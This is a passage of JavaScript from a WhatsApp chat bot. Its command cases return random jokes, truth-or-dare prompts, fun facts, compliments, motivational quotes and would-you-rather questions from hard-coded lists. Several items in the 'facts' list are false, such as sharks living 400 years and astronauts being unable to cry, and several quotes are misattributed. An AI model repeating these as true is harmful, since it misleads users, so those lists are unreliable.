            "Why don’t oysters donate to charity? Because they are shellfish.",
            "I want to be a professional kleptomaniac, but I’m just stealing time.",
            "What did one wall say to the other? I'll meet you at the corner.",
            "I have a fear of speed bumps, but I am slowly getting over it.",
            "What’s a skeleton’s least favorite room in the house? The living room.",
            "I told my computer I needed a break, and it froze.",
            "What do you call fake spaghetti? An impasta!",
            "I told my wife she was getting too emotional during our argument, but she didn’t take it well.",
            "I have a joke about construction, but I’m still working on it.",
            "I threw a boomerang 10 years ago and I still haven’t gotten it back.",
            "What do you call an alligator in a vest? An investigator.",
            "What do you call a bear with no teeth? A gummy bear.",
            "Why don’t some couples go to the gym? Because some relationships don’t work out.",
            "I’ve started investing in stocks: beef, chicken, and vegetable. One day I hope to be a bouillonaire.",
            "I got a job at a bakery because I kneaded dough.",
            "What’s a skeleton’s least favorite room in the house? The living room."
        ];
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*🤣 Joke Time! 🤣*\n\n${jokes[Math.floor(Math.random() * jokes.length)]}\n\n*Hope that made you smile! 😄*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the joke. Please try again later.');
        console.error('Joke error:', err);
    }
    break;
    case 'truth':
    try {
        // List of 100 truth questions
        const truthQuestions = [
            "What is your biggest fear?",
            "Have you ever lied to get out of trouble?",
            "What’s something you’ve never told anyone?",
            "If you could switch lives with someone for a day, who would it be?",
            "What’s the most embarrassing thing you’ve done?",
            "If you had to choose one person to be stuck with on a deserted island, who would it be?",
            "Have you ever had a crush on someone in this group?",
            "What’s the most awkward situation you’ve ever been in?",
            "If you could erase one event from your memory, what would it be?",
            "What’s one thing you regret doing in your life?",
            "What’s the last lie you told?",
            "Have you ever cheated in a relationship?",
            "What’s the most embarrassing thing that’s happened to you in public?",
            "What’s something you’ve done that your parents would disapprove of?",
            "Have you ever stolen something?",
            "What’s a secret you’ve never shared?",
            "What’s your biggest pet peeve?",
            "Who was your first crush?",
            "What’s the worst thing you’ve ever done to someone?",
            "Have you ever been in love?",
            "If you could date anyone in this group, who would it be?",
            "What’s something you’re really insecure about?",
            "What’s the worst date you’ve ever had?",
            "Have you ever had an awkward moment with someone you liked?",
            "What’s the craziest thing you’ve done for love?",
            "Have you ever had a one-night stand?",
            "What’s your worst habit?",
            "What’s your favorite physical feature about yourself?",
            "What’s your most embarrassing childhood memory?",
            "If you could live anywhere in the world, where would it be?",
            "What’s the most embarrassing thing you’ve said to someone?",
            "Have you ever cried in front of someone?",
            "What’s a secret talent you have?",
            "What’s your biggest insecurity?",
            "What’s the worst thing you’ve done at work or school?",
            "What’s the worst advice you’ve ever taken?",
            "Have you ever been caught doing something you shouldn’t?",
            "If you could be famous for something, what would it be?",
            "What’s one thing you’ve always wanted to do but never had the courage to?",
            "Have you ever broken someone’s heart?",
            "What’s the most rebellious thing you’ve done?",
            "Have you ever had a crush on a teacher?",
            "What’s the weirdest dream you’ve ever had?",
            "What’s the most awkward thing you’ve ever done to impress someone?",
            "If you could switch bodies with someone for a day, who would it be?",
            "What’s the worst mistake you’ve made in a relationship?",
            "Have you ever been in a secret relationship?",
            "What’s the worst gift you’ve ever received?",
            "What’s your biggest turn-on?",
            "Have you ever told someone you loved them without meaning it?",
            "What’s the worst job you’ve ever had?",
            "Have you ever lied on your resume?",
            "What’s something you’ve done that made you feel proud?",
            "Have you ever ghosted someone?",
            "What’s the biggest lie you’ve ever told?",
            "What’s one thing you would change about yourself?",
            "If you could have one wish right now, what would it be?",
            "Have you ever been in a physical fight?",
            "What’s the most embarrassing thing that happened to you in school?",
            "What’s something you’ve never told anyone about your childhood?",
            "What’s something you’ve done that your friends don’t know about?",
            "What’s your most awkward family gathering memory?",
            "What’s something you would never do even for a million dollars?",
            "Have you ever been in trouble with the law?",
            "What’s the last thing you searched for on your phone?",
            "Have you ever done something that you regretted instantly?",
            "What’s the worst thing you’ve done at a party?",
            "What’s something you hate about yourself?",
            "Have you ever betrayed a friend?",
            "What’s the weirdest thing you’ve ever eaten?",
            "What’s the most embarrassing thing you’ve done on a date?",
            "If you could change one thing about your personality, what would it be?",
            "Have you ever had a crush on someone you shouldn’t?",
            "What’s something you’ve done that you’d never admit to anyone?",
            "What’s the worst advice you’ve ever given?",
            "What’s the most awkward thing you’ve done in a job interview?",
            "Have you ever been caught cheating on a test?",
            "What’s the most embarrassing thing you’ve done on social media?",
            "What’s the worst thing you’ve done for money?",
            "Have you ever been attracted to someone’s partner?",
            "What’s the craziest thing you’ve ever done on a dare?",
            "Have you ever been rejected by someone you liked?",
            "What’s the worst breakup you’ve ever had?",
            "What’s the worst decision you’ve made in the past year?",
            "Have you ever lied to your best friend?",
            "What’s the most embarrassing thing you’ve done while drunk?",
            "What’s something you’ve done to avoid confrontation?",
            "Have you ever been caught sneaking out?",
            "What’s the worst thing you’ve done in the name of revenge?",
            "Have you ever done something you’re ashamed of in public?",
            "What’s something you’ve been hiding from your family?",
            "What’s the most embarrassing thing you’ve done at work?",
            "Have you ever taken a risk that didn’t pay off?",
            "What’s something you’ve done that you’re proud of but never told anyone?",
            "What’s the weirdest thing you’ve found on the internet?",
            "What’s the most embarrassing text you’ve sent?",
            "What’s the last thing you lied about?",
            "What’s the worst job interview you’ve ever had?",
            "Have you ever been in an awkward situation with someone you didn’t know well?",
            "What’s your most embarrassing online moment?",
            "What’s the most embarrassing thing you’ve done in front of your crush?",
            "What’s your biggest regret in life?",
            "Have you ever made a prank call?",
            "What’s your most embarrassing family moment?",
            "Have you ever been in love with someone who didn’t love you back?"
        ];

        // Send a random truth question directly to the user
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*😳 Truth Time! 😳*\n\n${truthQuestions[Math.floor(Math.random() * truthQuestions.length)]}\n\n*Your turn to be honest! 😅*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the truth question. Please try again later.');
        console.error('Truth error:', err);
    }
    break;
    case 'dare':
    try {
        // List of 100 dare challenges
        const dareChallenges = [
            "I dare you to send a funny selfie to the group.",
            "I dare you to try to sing a song and send the voice note.",
            "I dare you to do 10 push-ups and send a video of it.",
            "I dare you to post a random emoji in the chat and leave it there for 10 minutes.",
            "I dare you to tell a funny joke to the group right now.",
            "I dare you to make a funny face and send a photo of it.",
            "I dare you to send a message in a completely different accent for the rest of the chat.",
            "I dare you to share an embarrassing childhood story.",
            "I dare you to share your last search history with the group.",
            "I dare you to send a voice note singing your favorite song.",
            "I dare you to write a funny poem about someone in the group.",
            "I dare you to try a dance move and record it.",
            "I dare you to pretend to be a celebrity for the next 10 minutes.",
            "I dare you to tell the funniest joke you know.",
            "I dare you to post a random video of you dancing to any song.",
            "I dare you to share a weird secret talent you have.",
            "I dare you to make a prank call to someone in the group.",
            "I dare you to try to talk in rhyme for the next 5 minutes.",
            "I dare you to share an embarrassing story from your teenage years.",
            "I dare you to tell the group an embarrassing fact about yourself.",
            "I dare you to do your best impression of someone in the group.",
            "I dare you to act like a robot for the next 5 minutes.",
            "I dare you to do 20 jumping jacks on camera.",
            "I dare you to speak only in questions for the next 5 minutes.",
            "I dare you to share a weird food combination you like.",
            "I dare you to send a voice note singing the alphabet.",
            "I dare you to make a funny face and keep it for 30 seconds.",
            "I dare you to send a video of you making an unusual sound.",
            "I dare you to pretend you are a character from a movie for 5 minutes.",
            "I dare you to do an impression of someone famous and send a video.",
            "I dare you to wear something ridiculous and send a photo of yourself.",
            "I dare you to try a random dance challenge from TikTok.",
            "I dare you to change your profile picture to something funny for 24 hours.",
            "I dare you to post a video of you attempting a backflip.",
            "I dare you to do your best impression of an animal sound.",
            "I dare you to make a funny voice and send a voice note.",
            "I dare you to eat something spicy and record your reaction.",
            "I dare you to wear socks on your hands and take a picture.",
            "I dare you to sing a random song loudly in your room and send a video.",
            "I dare you to draw a silly doodle and share it with the group.",
            "I dare you to take a 10-second video of you jumping up and down.",
            "I dare you to make up a silly song and sing it for the group.",
            "I dare you to act like a famous celebrity for the next 10 minutes.",
            "I dare you to wear your clothes backward for the next hour.",
            "I dare you to take a picture of your messy room and share it.",
            "I dare you to do a cartwheel and record it.",
            "I dare you to try to say the alphabet backwards.",
            "I dare you to put your favorite item of clothing on your head and take a picture.",
            "I dare you to send a video of you eating something sour.",
            "I dare you to post a video of you trying to imitate an animal's walk.",
            "I dare you to send a video of you lip-syncing to a song.",
            "I dare you to dance like a robot for one minute.",
            "I dare you to write a funny tweet and share it on social media.",
            "I dare you to record yourself eating a spoonful of peanut butter.",
            "I dare you to do a slow-motion video of you jumping in the air.",
            "I dare you to try to juggle three objects and film yourself.",
            "I dare you to sing a love song in a funny voice.",
            "I dare you to talk in rhyme for the next five messages.",
            "I dare you to take a photo of your reaction to seeing an animal on TV.",
            "I dare you to put on sunglasses and walk around your house like you're famous.",
            "I dare you to say a tongue twister five times fast without making a mistake.",
            "I dare you to create a new handshake with someone and record it.",
            "I dare you to try to touch your toes while standing for one minute.",
            "I dare you to send a voice message singing the chorus of your favorite song.",
            "I dare you to make a TikTok video of you doing a silly challenge.",
            "I dare you to send a video of you pretending to be a superhero.",
            "I dare you to take a silly selfie with a random object.",
            "I dare you to send a video of you trying to jump rope for one minute.",
            "I dare you to try to walk like a penguin for 30 seconds.",
            "I dare you to try to mimic the sound of a duck.",
            "I dare you to talk to a random person and try to make them laugh.",
            "I dare you to post a funny meme on your story.",
            "I dare you to send a video of you trying a new hairstyle.",
            "I dare you to create a funny, short skit and send it to the group.",
            "I dare you to record yourself acting out a scene from a movie.",
            "I dare you to put on the most ridiculous outfit you have and take a picture.",
            "I dare you to make a funny video and try to get everyone to laugh.",
            "I dare you to share a funny story that happened to you recently.",
            "I dare you to do a dramatic reading of a children’s book.",
            "I dare you to attempt a yoga pose and send a photo.",
            "I dare you to make a short video of you doing your best runway walk.",
            "I dare you to send a voice note singing any song with enthusiasm.",
            "I dare you to record yourself doing a funny dance move.",
            "I dare you to put your clothes on inside out and take a picture.",
            "I dare you to try to make a sandwich blindfolded and send a video of it.",
            "I dare you to act like you're on a cooking show and demonstrate making a simple snack.",
            "I dare you to do 20 sit-ups in a row and record it.",
            "I dare you to talk in a funny accent for the next 10 minutes.",
            "I dare you to write a poem about someone in the group.",
            "I dare you to create a funny TikTok dance and share it.",
            "I dare you to do a dramatic reading of the lyrics to a pop song.",
            "I dare you to send a voice note singing the first verse of your favorite song.",
            "I dare you to wear your clothes in a crazy combination for the next hour.",
            "I dare you to try to do a split and send a video.",
            "I dare you to make up a silly nickname for yourself and introduce yourself with it.",
            "I dare you to send a video of you making a funny face.",
            "I dare you to try a random food combination and film your reaction.",
            "I dare you to take a 5-second video of you jumping around like a kangaroo.",
            "I dare you to act like a famous cartoon character for the next 5 minutes.",
            "I dare you to imitate a famous celebrity’s voice and send a voice note.",
            "I dare you to wear socks on your hands for the next 15 minutes.",
            "I dare you to tell a really cheesy joke to the group.",
            "I dare you to wear a ridiculous wig and take a picture.",
            "I dare you to try to balance an object on your head for one minute."
        ];

        // Send a random dare challenge directly to the user
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*😜 Dare Time! 😜*\n\n${dareChallenges[Math.floor(Math.random() * dareChallenges.length)]}\n\n*Are you up for it?*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the dare challenge. Please try again later.');
        console.error('Dare error:', err);
    }
    break;
    case 'fact':
    try {
        // List of 100 random facts
        const facts = [
            "Bananas are berries, but strawberries aren’t.",
            "A group of flamingos is called a 'flamboyance.'",
            "Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3,000 years old and still perfectly edible.",
            "Octopuses have three hearts and blue blood.",
            "The Eiffel Tower can be 15 cm taller during the summer due to the expansion of metal in heat.",
            "Wombat poop is cube-shaped.",
            "The shortest commercial flight in the world is between two Scottish islands and lasts only 57 seconds.",
            "A day on Venus is longer than a year on Venus.",
            "Cleopatra lived closer in time to the moon landing than to the construction of the Great Pyramid of Giza.",
            "The longest hiccuping spree lasted 68 years.",
            "You can't hum while holding your nose.",
            "The inventor of the Pringles can is buried in one.",
            "Sharks existed before trees.",
            "Cows have best friends and can become stressed when separated from them.",
            "A single cloud can weigh more than a million pounds.",
            "Bamboo can grow up to 35 inches in a single day.",
            "The heart of a blue whale is the size of a small car.",
            "There are more stars in the universe than grains of sand on all the Earth’s beaches.",
            "A bolt of lightning is five times hotter than the surface of the sun.",
            "Sloths can hold their breath for up to 40 minutes underwater.",
            "The unicorn is Scotland’s national animal.",
            "Polar bear skin is black, although their fur appears white.",
            "Apples are more effective at waking you up in the morning than coffee.",
            "The shortest war in history lasted 38 to 45 minutes between Britain and Zanzibar in 1896.",
            "Hawaii moves 7.5cm closer to Japan every year.",
            "Cows can walk upstairs, but they can’t walk down.",
            "In space, astronauts cannot cry because there is no gravity to make the tears flow.",
            "Venus is the hottest planet in our solar system, even though Mercury is the closest to the Sun.",
            "A crocodile cannot stick its tongue out.",
            "The longest time between two twins being born is 87 days.",
            "Koalas sleep up to 22 hours a day.",
            "Dolphins have names for each other and can call out to each other.",
            "The Great Wall of China is not visible from space with the naked eye.",
            "Banging your head against a wall for one hour burns 150 calories.",
            "The Eiffel Tower can be 15 cm taller during the summer.",
            "An astronaut's height can change by up to 2 inches in space.",
            "The first person to go to space was Yuri Gagarin from the Soviet Union in 1961.",
            "Sharks can live for up to 400 years.",
            "There are no naturally occurring blue foods.",
            "The world’s oldest piece of chewing gum is over 9,000 years old.",
            "Mount Everest grows by about 4 millimeters every year.",
            "A jellyfish is 95% water.",
            "The average person walks the equivalent of three times around the world in a lifetime.",
            "One teaspoon of honey represents the life work of 12 bees.",
            "There are more trees on Earth than there are stars in the Milky Way.",
            "The word 'nerd' was first coined by Dr. Seuss in *If I Ran the Zoo*.",
            "There is a species of jellyfish that is biologically immortal.",
            "A day on Mercury is twice as long as a year on Mercury.",
            "Cheetahs are the fastest land animals and can run up to 60 mph.",
            "A blue whale’s tongue can weigh as much as an elephant.",
            "The first video ever uploaded to YouTube was titled 'Me at the zoo.'",
            "The longest hiccuping spree lasted 68 years.",
            "An ostrich’s eye is bigger than its brain.",
            "A group of owls is called a parliament.",
            "A snail can sleep for three years.",
            "Peanuts are not nuts; they are legumes.",
            "Sloths can take up to a month to digest their food.",
            "There are more fake flamingos in the world than real ones.",
            "The longest place name in the world is in New Zealand and has 85 characters.",
            "A giraffe's neck contains the same number of vertebrae as a human’s neck.",
            "The unicorn is Scotland’s national animal.",
            "An octopus has three hearts and blue blood.",
            "A sneeze can travel as fast as 100 miles per hour.",
            "The human nose can distinguish at least 1 trillion different scents.",
            "There’s a species of fungus called *'Zombie fungus'* that can take control of ants' bodies.",
            "A shrimp's heart is located in its head.",
            "In Japan, there’s a museum dedicated entirely to Ramen noodles.",
            "The longest hiccuping spree lasted for 68 years.",
            "A panda's diet consists of 99% bamboo.",
            "The most commonly used letter in the English language is 'e'.",
            "Bananas are naturally radioactive.",
            "Honey never spoils.",
            "There’s a species of jellyfish that can revert to its youthful state after adulthood.",
            "Venus is the hottest planet in the solar system.",
            "Elephants can hear through their feet.",
            "Astronauts' height changes in space due to the absence of gravity.",
            "A duck's quack doesn't echo.",
            "The longest wedding veil was longer than 63 football fields.",
            "A day on Neptune lasts 16 hours.",
            "The Eiffel Tower was originally intended to be a temporary structure.",
            "Cats have 32 muscles in each ear.",
            "The longest recorded time without sleep is 11 days.",
            "The shortest war in history was between Britain and Zanzibar, lasting only 38 minutes.",
            "There are no words in the dictionary that rhyme with 'orange.'",
            "A day on Mars is only 40 minutes longer than a day on Earth.",
            "The sound of a whip cracking is faster than the speed of sound.",
            "A leap year has 366 days instead of 365.",
            "A sneeze can travel at speeds of up to 100 miles per hour.",
            "One light-year is about 5.88 trillion miles.",
            "A giraffe’s tongue is about 18 inches long.",
            "The human eye can distinguish about 10 million different colors.",
            "A snail can sleep for three years.",
            "The strongest muscle in the human body is the masseter (jaw muscle).",
            "The world’s largest desert is the Antarctic Desert.",
            "You can’t hum while holding your nose.",
            "The longest hiccuping spree lasted for 68 years.",
            "Polar bears have black skin beneath their white fur.",
            "The largest snowflake ever recorded was 15 inches wide.",
            "The moon is moving away from the Earth by about 1.5 inches each year.",
            "The world’s smallest mammal is the bumblebee bat.",
            "The first recorded Olympic Games were held in 776 BC in Greece.",
            "An octopus can change its color to blend into its surroundings.",
            "A frog can freeze itself in winter and thaw out in the spring.",
            "The longest time someone has gone without eating is 382 days.",
            "Caffeine is the most widely used psychoactive drug in the world.",
            "The longest time anyone has held their breath underwater is 24 minutes.",
            "A panda’s thumb is actually an extended wrist bone.",
            "The largest living organism in the world is a fungus in Oregon, covering 2,385 acres."
        ];

        // Send a random fact directly to the user
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*🤯 Fun Fact Time! 🤯*\n\n${facts[Math.floor(Math.random() * facts.length)]}\n\n*Did you learn something new? 🤓*`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the fact. Please try again later.');
        console.error('Fact error:', err);
    }
    break;
    case 'compliment':
    try {
        const compliments = [
            "You're an amazing person, inside and out!",
            "You have such a beautiful soul!",
            "Your smile is contagious!",
            "You're so smart and creative!",
            "You light up the room whenever you walk in!",
            "You're an absolute joy to be around!",
            "Your energy is so positive!",
            "You're doing great things, keep it up!",
            "You have a heart of gold!",
            "Your kindness makes the world a better place!",
            "You make everything seem so easy!",
            "You're a true inspiration!",
            "The world needs more people like you!",
            "Your laugh is the best sound ever!",
            "You're a natural at everything you do!",
            "You radiate positivity and joy!",
            "You're a shining star!",
            "You have an incredible ability to make people feel good!",
            "Your creativity knows no bounds!",
            "You are a one-of-a-kind gem!",
            "You're an amazing listener!",
            "You have such an infectious enthusiasm!",
            "You're always so thoughtful and considerate!",
            "You're a beautiful person, inside and out!",
            "You have a gift for making everyone feel special!",
            "You're a master at everything you do!",
            "Your personality lights up every room!",
            "You're a true friend and a loyal companion!",
            "You're always so brave and courageous!",
            "You have such a unique and special perspective!",
            "You're one of a kind, and that's awesome!",
            "Your sense of humor is absolutely amazing!",
            "You're such a positive influence on everyone around you!",
            "You're full of incredible ideas!",
            "You have such an infectious energy!",
            "You're a dream to work with!",
            "You have a special way of making others feel at ease!",
            "You're truly a ray of sunshine!",
            "Your intelligence is so impressive!",
            "You're an inspiration to those around you!",
            "You make life so much better just by being in it!",
            "You have such an amazing work ethic!",
            "You brighten up everyone's day!",
            "You're such a hard worker, and it shows!",
            "You're an absolute star in everything you do!",
            "You have the most beautiful heart!",
            "You always know how to make people smile!",
            "You're such a thoughtful and caring person!",
            "You're a great role model!",
            "You have a unique and beautiful perspective on life!",
            "You always brighten up the room with your presence!",
            "You're someone who everyone loves being around!",
            "You have an incredible ability to make others feel special!",
            "You're a true visionary!",
            "Your wisdom is beyond your years!",
            "You're always so encouraging and uplifting!",
            "You're always so patient and understanding!",
            "You have such a beautiful, positive spirit!",
            "You inspire others to be the best version of themselves!",
            "You're so passionate about everything you do!",
            "Your energy is absolutely magnetic!",
            "You're such a great team player!",
            "You make the world a better place just by being you!",
            "Your presence makes everything better!",
            "You are so genuinely kind and caring!",
            "You're such an incredible problem solver!",
            "You're an amazing motivator!",
            "You have such a beautiful mind!",
            "You're so generous with your time and energy!",
            "You have a great sense of style!",
            "You're an absolute joy to be around!",
            "You make everyone feel so comfortable!",
            "You're always so supportive and encouraging!",
            "You're a true leader in every sense of the word!",
            "You're someone that people admire and look up to!",
            "You have such a big heart!",
            "You're always so thoughtful and kind-hearted!",
            "You're truly a gem in this world!",
            "You have a way of making everyone feel important!",
            "You bring so much joy to those around you!",
            "You have a fantastic sense of humor!",
            "You're a natural at making people feel valued!",
            "You're such a great friend!",
            "You have such an amazing soul!",
            "You bring so much positivity into the world!",
            "You're such a great listener and friend!",
            "You have a heart that’s always open to others!",
            "You make every day brighter just by being you!",
            "You have the most wonderful energy!",
            "You make everyone feel so welcome!",
            "You're an amazing person to have around!",
            "You're such a wonderful spirit!",
            "You're always so kind and generous!",
            "You have an incredible ability to make others feel comfortable!",
            "You're a true gem!",
            "You're so kind-hearted and generous!",
            "You're truly one of a kind!",
            "You're the kind of person who makes the world a better place!",
            "You're amazing just the way you are!",
            "You're full of incredible potential!",
            "You have such a magnetic personality!",
            "You're a treasure to be around!",
            "You're always so friendly and approachable!",
            "You make the world more beautiful just by being in it!",
            "You're an absolute gem of a person!",
            "You're always so full of life!",
            "You brighten everyone's day just by being yourself!",
            "You're truly one of the most remarkable people I know!"
        ];

        await PhistarBotInc.sendMessage(m.chat, {
            text: `*💖 Compliment Time! 💖*\n\n${compliments[Math.floor(Math.random() * compliments.length)]}`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the compliment. Please try again later.');
        console.error('Compliment error:', err);
    }
    break;
    case 'quote':
    try {
        const quotes = [
            "The only way to do great work is to love what you do. – Steve Jobs",
            "Success is not the key to happiness. Happiness is the key to success. – Albert Schweitzer",
            "Don't watch the clock; do what it does. Keep going. – Sam Levenson",
            "The best way to predict the future is to create it. – Abraham Lincoln",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "In the middle of every difficulty lies opportunity. – Albert Einstein",
            "What lies behind us and what lies before us are tiny matters compared to what lies within us. – Ralph Waldo Emerson",
            "Do not wait to strike till the iron is hot, but make it hot by striking. – William Butler Yeats",
            "It does not matter how slowly you go as long as you do not stop. – Confucius",
            "The future belongs to those who believe in the beauty of their dreams. – Eleanor Roosevelt",
            "The only way to achieve the impossible is to believe it is possible. – Charles Kingsleigh",
            "Act as if what you do makes a difference. It does. – William James",
            "Success is not final, failure is not fatal: It is the courage to continue that counts. – Winston Churchill",
            "It always seems impossible until it's done. – Nelson Mandela",
            "You miss 100% of the shots you don't take. – Wayne Gretzky",
            "Everything you can imagine is real. – Pablo Picasso",
            "Life is 10% what happens to us and 90% how we react to it. – Charles R. Swindoll",
            "Don’t wait. The time will never be just right. – Napoleon Hill",
            "Your time is limited, so don’t waste it living someone else’s life. – Steve Jobs",
            "To be yourself in a world that is constantly trying to make you something else is the greatest accomplishment. – Ralph Waldo Emerson",
            "The only limit to our realization of tomorrow is our doubts of today. – Franklin D. Roosevelt",
            "Happiness is not something ready-made. It comes from your own actions. – Dalai Lama",
            "The pessimist sees difficulty in every opportunity. The optimist sees opportunity in every difficulty. – Winston Churchill",
            "Do what you can with all you have, wherever you are. – Theodore Roosevelt",
            "It is never too late to be what you might have been. – George Eliot",
            "A journey of a thousand miles begins with a single step. – Lao Tzu",
            "You must be the change you wish to see in the world. – Mahatma Gandhi",
            "Your life does not get better by chance, it gets better by change. – Jim Rohn",
            "We do not remember days, we remember moments. – Cesare Pavese",
            "The harder you work for something, the greater you’ll feel when you achieve it. – Unknown",
            "Dream big and dare to fail. – Norman Vaughan",
            "Don't be afraid to give up the good to go for the great. – John D. Rockefeller",
            "Success is walking from failure to failure with no loss of enthusiasm. – Winston Churchill",
            "Don't watch the clock; do what it does. Keep going. – Sam Levenson",
            "You don’t have to be great to start, but you have to start to be great. – Zig Ziglar",
            "The only way to do great work is to love what you do. – Steve Jobs",
            "If you can dream it, you can do it. – Walt Disney",
            "Everything you can imagine is real. – Pablo Picasso",
            "Life is either a daring adventure or nothing at all. – Helen Keller",
            "The best way to predict the future is to invent it. – Alan Kay",
            "You are never too old to set another goal or to dream a new dream. – C.S. Lewis",
            "I find that the harder I work, the more luck I seem to have. – Thomas Jefferson",
            "Success usually comes to those who are too busy to be looking for it. – Henry David Thoreau",
            "The only person you are destined to become is the person you decide to be. – Ralph Waldo Emerson",
            "You only live once, but if you do it right, once is enough. – Mae West",
            "Success is the sum of small efforts, repeated day in and day out. – Robert Collier",
            "Everything has beauty, but not everyone can see it. – Confucius",
            "To be great is to be misunderstood. – Ralph Waldo Emerson",
            "In the end, we will remember not the words of our enemies, but the silence of our friends. – Martin Luther King Jr.",
            "The journey of a thousand miles begins with one step. – Lao Tzu",
            "Live as if you were to die tomorrow. Learn as if you were to live forever. – Mahatma Gandhi",
            "It does not matter how slowly you go, as long as you do not stop. – Confucius",
            "What you get by achieving your goals is not as important as what you become by achieving your goals. – Zig Ziglar",
            "Believe you can and you're halfway there. – Theodore Roosevelt",
            "The only thing standing between you and your goal is the story you keep telling yourself as to why you can’t achieve it. – Jordan Belfort",
            "It’s not whether you get knocked down, it’s whether you get up. – Vince Lombardi",
            "You are braver than you believe, stronger than you seem, and smarter than you think. – A.A. Milne",
            "Success is not in what you have, but who you are. – Bo Bennett",
            "Life isn’t about finding yourself. Life is about creating yourself. – George Bernard Shaw",
            "If you want to achieve greatness stop asking for permission. – Anonymous",
            "You can't use up creativity. The more you use, the more you have. – Maya Angelou",
            "Everything you’ve ever wanted is on the other side of fear. – George Addair",
            "What we think, we become. – Buddha",
            "I am not a product of my circumstances. I am a product of my decisions. – Stephen Covey",
            "Go confidently in the direction of your dreams. Live the life you have imagined. – Henry David Thoreau",
            "The best revenge is massive success. – Frank Sinatra",
            "There are no shortcuts to any place worth going. – Beverly Sills",
            "Do what you love, and you’ll never work another day in your life. – Confucius",
            "Opportunities don't happen, you create them. – Chris Grosser",
            "The harder you work for something, the greater you’ll feel when you achieve it. – Unknown",
            "If you don’t design your own life plan, chances are you’ll fall into someone else’s plan. – Jim Rohn",
            "Everything you can imagine is real. – Pablo Picasso",
            "Success is not final, failure is not fatal: it is the courage to continue that counts. – Winston Churchill",
            "You must be the change you wish to see in the world. – Mahatma Gandhi",
            "The purpose of life is not to be happy. It is to be useful, to be honorable, to be compassionate, to have it make some difference that you have lived and lived well. – Ralph Waldo Emerson",
            "Don’t stop when you’re tired. Stop when you’re done. – Unknown",
            "Life is what happens when you’re busy making other plans. – John Lennon",
            "You can never cross the ocean until you have the courage to lose sight of the shore. – Christopher Columbus",
            "The best way to predict the future is to create it. – Peter Drucker",
            "The only impossible journey is the one you never begin. – Tony Robbins",
            "If you want to live a happy life, tie it to a goal, not to people or things. – Albert Einstein",
            "Don’t wait for the perfect moment. Take the moment and make it perfect. – Unknown",
            "Happiness depends upon ourselves. – Aristotle",
            "Everything has beauty, but not everyone can see it. – Confucius",
            "Your life does not get better by chance, it gets better by change. – Jim Rohn",
            "The journey of a thousand miles begins with a single step. – Lao Tzu",
            "Don’t let yesterday take up too much of today. – Will Rogers",
            "The secret to getting ahead is getting started. – Mark Twain",
            "Don't be pushed around by the fears in your mind. Be led by the dreams in your heart. – Roy T. Bennett",
            "Life is either a daring adventure or nothing at all. – Helen Keller"
        ];
        
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*💬 Quote of the Day 💬*\n\n${quotes[Math.floor(Math.random() * quotes.length)]}`
        }, { quoted: m });

    } catch (err) {
        replyphistar('❌ An error occurred while retrieving the quote. Please try again later.');
        console.error('Quote error:', err);
    }
    break;
    case 'wouldyourather':
    try {
        const wouldYouRatherQuestions = [
            "Would you rather be able to speak all languages or be able to speak to animals?",
            "Would you rather have the ability to fly or the ability to turn invisible?",
            "Would you rather have a rewind button or a pause button in your life?",
            "Would you rather always have to sing instead of speaking or dance everywhere you go?",
            "Would you rather never be able to use the internet again or never be able to watch TV again?",
            "Would you rather be famous for something good or infamous for something bad?",
            "Would you rather always be 10 minutes late or always be 20 minutes early?",
            "Would you rather have a personal chef or a personal driver?",
            "Would you rather never have to sleep again or never have to eat again?",
            "Would you rather live in a world where there is no war or a world where there is no hunger?",
            "Would you rather be able to talk to animals or be able to read minds?",
            "Would you rather be rich but lonely or poor but surrounded by loved ones?",
            "Would you rather have super strength or super intelligence?",
            "Would you rather be able to time travel or teleport anywhere instantly?",
            "Would you rather have a photographic memory or be able to forget anything at will?",
            "Would you rather live in a house on the beach or in a cabin in the mountains?",
            "Would you rather be able to control the weather or have the ability to control time?",
            "Would you rather live without music or without movies?",
            "Would you rather always be hot or always be cold?",
            "Would you rather fight 100 duck-sized horses or one horse-sized duck?",
            "Would you rather be able to breathe underwater or fly through the sky?",
            "Would you rather have the ability to speak every language or master every instrument?",
            "Would you rather be constantly tired but still productive or full of energy but lazy?",
            "Would you rather be the smartest person in the world or the funniest?",
            "Would you rather be able to talk to your past self or your future self?",
            "Would you rather live without social media or without your phone?",
            "Would you rather be able to see the future or change the past?",
            "Would you rather never get tired or never feel pain?",
            "Would you rather never have to work again or never have to sleep again?",
            "Would you rather have an unlimited supply of food or unlimited entertainment?",
            "Would you rather have no responsibilities or have a lot of responsibilities but all paid for?",
            "Would you rather always know when someone is lying or always get away with lying?",
            "Would you rather have the ability to create new worlds or explore new worlds?",
            "Would you rather live in a utopia or a dystopia?",
            "Would you rather be able to change your appearance at will or read minds?",
            "Would you rather never be able to get sick or never feel sadness?",
            "Would you rather always be surrounded by people or always be alone?",
            "Would you rather never experience failure or never experience success?",
            "Would you rather have a house full of plants or a house full of pets?",
            "Would you rather always have perfect health or be able to recover instantly from injury?",
            "Would you rather be able to predict the weather or predict the future?",
            "Would you rather always know the truth or never know the truth?",
            "Would you rather be in a relationship with your dream partner or have the perfect career?",
            "Would you rather live in a futuristic city or a rustic village?",
            "Would you rather have the power of invincibility or the power to read minds?",
            "Would you rather be famous for something ridiculous or never be famous at all?",
            "Would you rather never have to do chores again or never have to work again?",
            "Would you rather have all the money in the world but no friends or be poor but surrounded by friends?",
            "Would you rather always be able to find the perfect gift for anyone or always be able to make anyone laugh?",
            "Would you rather be able to talk to animals or control the weather?",
            "Would you rather be the most talented person in the world but never recognized, or the least talented but famous?",
            "Would you rather always have perfect hair or perfect skin?",
            "Would you rather have the ability to teleport to any place or be able to talk to anyone in any language?",
            "Would you rather know all the secrets of the universe or know nothing at all?",
            "Would you rather always be happy but not able to do anything or be able to do anything but never be happy?",
            "Would you rather be in a group of friends who are always honest but brutal or friends who are always kind but not truthful?",
